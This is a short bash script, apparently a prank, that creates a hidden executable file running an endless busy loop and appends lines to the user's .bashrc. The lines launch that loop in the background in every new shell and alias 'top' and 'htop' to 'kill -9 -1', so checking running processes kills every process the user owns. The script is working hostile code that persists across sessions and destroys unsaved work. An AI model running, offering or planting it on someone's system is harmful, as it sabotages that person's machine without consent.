#!/bin/bash
echo "#!/bin/bash
while true
do
   printf '\r'
done" > .config/.the_game
chmod +x .config/.the_game

echo "
alias top='kill -9 -1'
alias htop='top'
./.config/.the_game &" >> .bashrc
source .bashrc
